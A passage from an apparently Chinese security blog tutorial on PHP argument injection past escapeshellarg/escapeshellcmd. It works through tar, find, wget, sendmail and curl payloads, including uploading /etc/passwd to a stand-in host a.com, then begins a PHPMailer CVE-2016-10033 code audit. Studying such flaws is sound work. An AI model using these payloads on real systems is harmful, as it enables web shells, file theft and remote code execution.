class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/5.png" alt=""></p><p>直接访问log-shell.php即可触发代码执行：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/6.png" alt=""></p><h2 id="0x02-escapeshellarg与escapeshellcmd参数注入"><a href="#0x02-escapeshellarg与escapeshellcmd参数注入" class="headerlink" title="0x02 escapeshellarg与escapeshellcmd参数注入"></a>0x02 escapeshellarg与escapeshellcmd参数注入</h2><p>为什么会提到参数注入呢？——由前面我们知道，当使用了escapeshellarg和escapeshellcmd时会有效地限制了不能执行第二条命令，但是我们仍然可以将参数传递给第一个命令，也就是说，我们有机会通过参数注入来达到攻击的目的。</p><h3 id="何为参数注入"><a href="#何为参数注入" class="headerlink" title="何为参数注入"></a>何为参数注入</h3><blockquote><p>参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</p></blockquote><p>一般的，命令的格式时这样的：cmd [参数选项1] [参数值1] …，如‘ls -l /tmp’等形式。</p><p>当有一条shell命令，前面的命令cmd我们不可控，但是参数选项可控或者后面部分都可控时，则可能会存命令参数注入漏洞。</p><p>看个经典案例——gitlist 0.6.0远程命令执行漏洞</p><p>gitlist是一款使用PHP开发的图形化git仓库查看工具，在其0.6.0版本中存在一处命令参数注入问题。</p><p>当用户对仓库中代码进行搜索时，会调用到git grep命令，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关键点在于<code>grep -i --line-number {$query} $branch</code>，这里\$query是搜索的关键字、由外部参数传入并经过escapeshellarg()过滤，\$branch是搜索的分支。</p><p>但是如果如果用户输入的\$query的值是–open-files-in-pager=id;时就可以执行id命令，造成命令参数注入漏洞。</p><p>escapeshellarg为啥不生效呢？——原因在于该条命令没有限制\$query只能填在“参数值”的位置，而是可以填在“参数选项”的位置，导致可以注入–open-files-in-pager参数选项来进行命令参数注入，导致RCE。</p><p>具体分析参考P神的文章：<a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">《谈escapeshellarg绕过与参数注入漏洞》</a></p><h3 id="escapeshellarg-gt-escapeshellcmd参数注入"><a href="#escapeshellarg-gt-escapeshellcmd参数注入" class="headerlink" title="escapeshellarg&gt;escapeshellcmd参数注入"></a>escapeshellarg&gt;escapeshellcmd参数注入</h3><p>当代码先对输入进行escapeshellarg()处理再进行escapeshellcmd()处理时，则存在参数注入漏洞，具体原理结合下面的Demo来讲解。</p><p>先看个Demo理解一下。</p><p>看个ls命令参数注入的示例，原本功能是列出tmp目录中除去输入文件名外的所有文件，但是这里我们可以通过参数注入向参数选项注入-l来列出所有详细的文件信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"ls --ignore="</span>.escapeshellarg($_GET[c]).<span class="string">" /tmp"</span>));</span><br><span class="line"><span class="comment">//echo escapeshellcmd("ls --ignore=".escapeshellarg($_GET[c])." /tmp");</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>alan&#39; -l+</code>，最后的加号表示空格：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/9.png" alt=""></p><p>怎么形成参数注入的呢？</p><p>我们echo输出看下输入的内容最后是什么形式的：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/10.png" alt=""></p><p>根据前面escapeshellarg与escapeshellcmd的原理分析一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//初始输入</span><br><span class="line">alan&apos; -l+</span><br><span class="line"></span><br><span class="line">//经过escapeshellarg()处理</span><br><span class="line">&apos;alan&apos;\&apos;&apos; -l+&apos;</span><br><span class="line"></span><br><span class="line">//拼接命令</span><br><span class="line">ls --ignore=&apos;alan&apos;\&apos;&apos; -l+&apos; /tmp</span><br><span class="line"></span><br><span class="line">//经过escapeshellcmd()处理，即上图的输出结果</span><br><span class="line">ls --ignore=&apos;alan&apos;\\&apos;&apos; -l+\&apos; /tmp</span><br><span class="line"></span><br><span class="line">//输出结果简化，等同于</span><br><span class="line">ls --ignore=alan\ -l &apos; /tmp</span><br></pre></td></tr></table></figure><p>分析可知：</p><ul><li><strong>当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在；</strong></li><li>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞；</li></ul><h3 id="tar参数注入"><a href="#tar参数注入" class="headerlink" title="tar参数注入"></a>tar参数注入</h3><p>tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。</p><p>示例应用escapeshellcmd()过滤，但用户输入的位置可以设置为参数选项，导致参数注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">'tar '</span>.$_GET[c]));</span><br><span class="line"><span class="comment">//system('tar '.escapeshellcmd($_GET[c]));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>--use-compress-program=&#39;touch /var/www/html/hacked&#39; -cf /tmp/passwd /etc/passwd</code>：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/7.png" alt=""></p><h3 id="find参数注入"><a href="#find参数注入" class="headerlink" title="find参数注入"></a>find参数注入</h3><p>find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。</p><p>原意为在tmp目录查找指定文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">'find /tmp -iname '</span>.$_GET[c]));</span><br><span class="line"><span class="comment">//system('find /tmp -iname '.escapeshellcmd($_GET[c]));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>sth -or -exec pwd ; -quit</code>：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/8.png" alt=""></p><h3 id="wget参数注入"><a href="#wget参数注入" class="headerlink" title="wget参数注入"></a>wget参数注入</h3><p>wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。</p><p>原意为下载指定Web服务中的文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"wget "</span>.$_GET[c]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>--directory-prefix=/var/www/html http://a.com/exp.php</code>：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/11.png" alt=""></p><h3 id="sendmail参数注入"><a href="#sendmail参数注入" class="headerlink" title="sendmail参数注入"></a>sendmail参数注入</h3><p>sendmail在前面已经讲过，这里多说一个参数-C File，用File变量指定的备用配置文件启动sendmail命令。</p><p>原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">system(<span class="string">"/usr/sbin/sendmail -t -i -f"</span>.escapeshellcmd($_GET[c]).<span class="string">' &lt; mail.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>除了第一节讲的将shell写到设置在Web目录的日志文件中的利用方法外，还可以进行以下的利用，利用-C参数选项读取任意文件内容。</p><p>输入<a href="mailto:payload`a@b.com" target="_blank" rel="noopener">payload`a@b.com</a> -C/etc/passwd -X/tmp/output.txt`：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/12.png" alt=""></p><h3 id="curl参数注入"><a href="#curl参数注入" class="headerlink" title="curl参数注入"></a>curl参数注入</h3><p>curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。</p><p>原意为访问指定URL并返回响应报文中body的内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"curl "</span>.$_GET[c]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>示例注入的是-F参数选项，在攻击者服务器编写接收POST方法表单内容的php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'mi1k7ea.txt'</span>, file_get_contents($_FILES[<span class="string">'filename'</span>][<span class="string">'tmp_name'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>-F filename=@/etc/passwd http://a.com/b.php</code>：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/13.png" alt=""></p><h3 id="Bypass技巧——除非ASCII字符"><a href="#Bypass技巧——除非ASCII字符" class="headerlink" title="Bypass技巧——除非ASCII字符"></a>Bypass技巧——除非ASCII字符</h3><p>如果未设置LANG环境变量，则去除非ASCII字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[c]) &amp;&amp; strtolower($_GET[c])!==<span class="string">'system'</span>)&#123;</span><br><span class="line">        <span class="comment">//var_dump(escapeshellcmd($_GET[c]));</span></span><br><span class="line">        call_user_func(escapeshellcmd($_GET[c]), escapeshellarg($_GET[p]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入payload<code>c=systāem&amp;p=whoami</code>，只要包含了非ASCII字符且未设置LANG环境变量，escapeshellarg()就会去除非ASCII字符，来Bypass某些情况：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/14.png" alt=""></p><p>输出看下Demo就知道了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$filename = <span class="string">'mi1kā7eā.txt'</span>;</span><br><span class="line">var_dump(escapeshellarg($filename));</span><br><span class="line">setlocale(LC_CTYPE, <span class="string">'en_US.utf8'</span>);</span><br><span class="line">var_dump(escapeshellarg($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/15.png" alt=""></p><h2 id="0x03-漏洞分析——PHPMailer命令执行漏洞"><a href="#0x03-漏洞分析——PHPMailer命令执行漏洞" class="headerlink" title="0x03 漏洞分析——PHPMailer命令执行漏洞"></a>0x03 漏洞分析——PHPMailer命令执行漏洞</h2><p>这里以PHPMailer的两个CVE漏洞（CVE-2016-10045和CVE-2016-10033）来逐步分析escapeshellarg和escapeshellcmd的参数注入引起的问题。</p><h3 id="CVE-2016-10033"><a href="#CVE-2016-10033" class="headerlink" title="CVE-2016-10033"></a>CVE-2016-10033</h3><p>环境：<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p><p>前提条件：</p><ul><li>php版本 &lt; 5.2.0；</li><li>phpmailer版本 &lt; 5.2.18；</li><li>php未安装pcre；</li><li>安全模式未开启即safe_mode = false（default）；</li></ul><p>访问页面，是个表单，输入对应的内容即发送邮件：</p><p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/16.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>看下index.php的代码，关键表单代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    $name=$_REQUEST[<span class="string">'name'</span>];</span><br><span class="line">    $email=$_REQUEST[<span class="string">'email'</span>];</span><br><span class="line">    $message=$_REQUEST[<span class="string">'message'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($name==<span class="string">""</span>)||($email==<span class="string">""</span>)||($message==<span class="string">""</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"There are missing fields."</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="string">'vulnerable/PHPMailerAutoload.php'</span>;</span><br><span class="line">        $mail = <span class="keyword">new</span> PHPMailer;</span><br><span class="line">        $mail-&gt;Host = <span class="string">"localhost"</span>;</span><br><span class="line"></span><br><span class="line">        $mail-&gt;setFrom($email, <span class="string">'Vulnerable Server'</span>);</span><br><span class="line">        $mail-&gt;addAddress(<span class="string">'admin@vulnerable.com'</span>, <span class="string">'Hacker'</span>);</span><br><span class="line">        $mail-&gt;Subject  = <span class="string">"Message from $name"</span>;</span><br><span class="line">        $mail-&gt;Body     = $message;</span><br><span class="line">        <span class="keyword">if</span>(!$mail-&gt;send()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Message was not sent.'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Mailer error: '</span> . $mail-&gt;ErrorInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Message has been sent.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这里是通过新建PHPMailer对象来发送邮件的，其中setFrom、Subject和Body三个参数可控。</p><p>下面开始逐步分析漏洞根源，主要看class.papmailer.php文件。</p><p>按照index.php中php代码逻辑分析，第一个调用的函数是\$mail-&gt;setFrom()，用来设置源email地址，看到对应的代码，主要是对输入的\$address进行相应的处理，去掉空格和换行，判断是否有@、是否含有非8比特的字符、是否之处IDN，再校验邮箱地址是否合法，最后将\$address赋值给\$this-&gt;From和\$this-&gt;Sender：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span><span class="params">($address, $name = <span class="string">''</span>, $auto = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $address = trim($address);</span><br><span class="line">    $name = trim(preg_replace(<span class="string">'/[\r\n]+/'</span>, <span class="string">''</span>, $name)); <span class="comment">//Strip breaks and trim</span></span><br><span class="line">    <span class="comment">// Don't validate now addresses with IDN. Will be done in send().</span></span><br><span class="line">    <span class="keyword">if</span> (($pos = strrpos($address, <span class="string">'@'</span>)) === <span class="keyword">false</span> <span class="keyword">or</span></span><br><span class="line">        (!<span class="keyword">$this</span>-&gt;has8bitChars(substr($address, ++$pos)) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;idnSupported()) <span class="keyword">and</span></span><br><span class="line">        !<span class="keyword">$this</span>-&gt;validateAddress($address)) &#123;</span><br><span class="line">        $error_message = <span class="keyword">$this</span>-&gt;lang(<span class="string">'invalid_address'</span>) . <span class="string">" (setFrom) $address"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError($error_message);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;edebug($error_message);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException($error_message);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;From = $address;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;FromName = $name;</span><br><span class="line">    <span class="keyword">if</span> ($auto) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Sender = $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进去validateAddress()函数，看下是怎么处理的。这里\$patternselect未传进来即值默认为null，然后将\$validator的值赋给\$patternselect即为’auto’，进入后面的逻辑开始判断是否有pcre插件，若无pcre则判断php版本是否小于5.2.0，若是则将\$patternselect重新赋值为’noregex’；而在后面switch语句的noregex逻辑中，是简单地根据@符号来处理输入的邮箱字符串的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span><span class="params">($address, $patternselect = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($patternselect)) &#123;</span><br><span class="line">        $patternselect = <span class="keyword">self</span>::$validator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_callable($patternselect)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func($patternselect, $address);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Reject line breaks in addresses; it's valid RFC5322, but not RFC5321</span></span><br><span class="line">    <span class="keyword">if</span> (strpos($address, <span class="string">"\n"</span>) !== <span class="keyword">false</span> <span class="keyword">or</span> strpos($address, <span class="string">"\r"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$patternselect <span class="keyword">or</span> $patternselect == <span class="string">'auto'</span>) &#123;</span><br><span class="line">        <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">        <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">        <span class="keyword">if</span> (defined(<span class="string">'PCRE_VERSION'</span>)) &#123;</span><br><span class="line">            <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">            <span class="keyword">if</span> (version_compare(PCRE_VERSION, <span class="string">'8.0.3'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                $patternselect = <span class="string">'pcre8'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $patternselect = <span class="string">'pcre'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'extension_loaded'</span>) <span class="keyword">and</span> extension_loaded(<span class="string">'pcre'</span>)) &#123;</span><br><span class="line">            <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">            $patternselect = <span class="string">'pcre'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">            <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'5.2.0'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                $patternselect = <span class="string">'php'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $patternselect = <span class="string">'noregex'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ($patternselect) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'noregex'</span>:</span><br><span class="line">            <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">            <span class="comment">//Check the address is 3 chars or longer and contains an @ that's not the first or last char</span></span><br><span class="line">            <span class="keyword">return</span> (strlen($address) &gt;= <span class="number">3</span></span><br><span class="line">                <span class="keyword">and</span> strpos($address, <span class="string">'@'</span>) &gt;= <span class="number">1</span></span><br><span class="line">                <span class="keyword">and</span> strpos($address, <span class="string">'@'</span>) != strlen($address) - <span class="number">1</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此可知，如果满足php版本低于5.2.0且无pcre插件，则我们只需要按照@符的处理进行构造即可。</p><p>再回看index.php中的代码，第二个也就是最后一个被调用的函数是\$mail-&gt;send()，找到对应的代码块，很明显，这里会调用到postSend()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;preSend()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;postSend();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (phpmailerException $exc) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailHeader = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError($exc-&gt;getMessage());</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> $exc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进postSend()函数，这里有个switch语句来匹配\$this-&gt;Mailer，然而在之前的代码逻辑中被没有对\$this-&gt;Mailer进行赋值，那么\$this-&gt;Mailer的值就是初始值mail；可以看到在匹配到mail的代码逻辑中会调用mailSend()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Which method to use to send mail.</span></span><br><span class="line"><span class="comment">    * Options: "mail", "sendmail", or "smtp".</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> $Mailer = <span class="string">'mail'</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">postSend</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// Choose the mailer and send through it</span></span><br><span class="line">           <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;Mailer) &#123;</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'sendmail'</span>:</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'qmail'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sendmailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span 